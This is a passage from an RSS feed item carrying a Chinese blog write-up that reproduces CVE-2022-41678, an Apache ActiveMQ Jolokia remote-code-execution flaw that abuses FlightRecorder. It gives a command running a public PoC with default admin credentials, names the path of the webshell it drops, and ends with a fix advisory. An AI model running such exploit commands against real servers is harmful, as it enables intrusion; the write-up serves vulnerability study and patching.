	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123659071_hu6995087566494929819.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013123659071_hu12769707916805950604.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;FlightRecorder的具体使用&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;420&#34;
		data-flex-basis=&#34;1010px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FlightRecorder&lt;/code&gt;是在OpenJDK 11中引入的特性，被用于记录Java虚拟机的运行事件。利用这个功能，攻击者可以将事件日志写入任意文件。&lt;/p&gt;
&lt;p&gt;使用【&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2022-41678/poc.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;POC&lt;/a&gt;】脚本来复现完整的过程（使用&lt;code&gt;--exploit&lt;/code&gt;参数指定使用的方法）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python poc.py -u admin -p admin --exploit jfr http://localhost:8161
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124144286.png&#34;
	width=&#34;1184&#34;
	height=&#34;178&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124144286_hu9943695569252429262.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124144286_hu5291215198284685797.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;poc成功执行可访问webshell&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;665&#34;
		data-flex-basis=&#34;1596px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Webshell被写入在&lt;code&gt;/admin/shelljfr.jsp&lt;/code&gt;文件中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124239783.png&#34;
	width=&#34;1007&#34;
	height=&#34;383&#34;
	srcset=&#34;http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124239783_hu2301320592021201549.png 480w, http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/assets/file-20241013124239783_hu5236171660789404911.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;确认存在该漏洞&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;262&#34;
		data-flex-basis=&#34;631px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;AMQ-9201 - Update Jolokia default access configuration · apache/activemq@6120169&lt;br&gt;
GitHub： &lt;a class=&#34;link&#34; href=&#34;https://github.com/apache/activemq/commit/6120169e5&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/apache/activemq/commit/6120169e5&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;附录&#34;&gt;附录
&lt;/h2&gt;&lt;h3 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;《&lt;a class=&#34;link&#34; href=&#34;https://l3yx.github.io/2023/11/29/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678-%E5%88%86%E6%9E%90/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache ActiveMQ Jolokia 远程代码执行漏洞(CVE-2022-41678)分析&lt;/a&gt;》&lt;/li&gt;
&lt;li&gt;《&lt;a class=&#34;link&#34; href=&#34;http://www.aqtd.com/nd.jsp?id=7505&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Apache ActiveMQ历史漏洞复现合集&lt;/a&gt;》&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;版权信息&#34;&gt;版权信息
&lt;/h3&gt;&lt;p&gt;本文原载于 &lt;a class=&#34;link&#34; href=&#34;https://ranch007.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Ranch&amp;rsquo;s Blog&lt;/a&gt;，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
